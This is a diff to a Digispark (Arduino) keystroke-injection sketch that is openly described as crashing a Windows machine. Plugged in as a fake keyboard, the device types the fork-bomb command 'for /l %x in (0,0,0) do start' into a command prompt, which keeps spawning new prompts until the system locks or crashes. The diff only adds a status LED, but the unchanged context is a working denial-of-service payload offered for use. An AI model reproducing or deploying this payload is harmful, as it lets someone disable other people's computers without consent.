@@ -1,6 +1,7 @@
 //This script opens up a Windows command prompt and makes it open up another instance of itself and so on until the machine can take it no more and either locks or crashes. Credits to BlackBoot.
 #include "DigiKeyboard.h"
 void setup() {
+	pinMode(1, OUTPUT);
 }
 
 void loop() {
@@ -21,6 +22,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.print(F("for /l %x in (0,0,0) do start"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  digitalWrite(1, HIGH);
   for (;;) {
     /*Stops the digispark from running the scipt again*/
   }
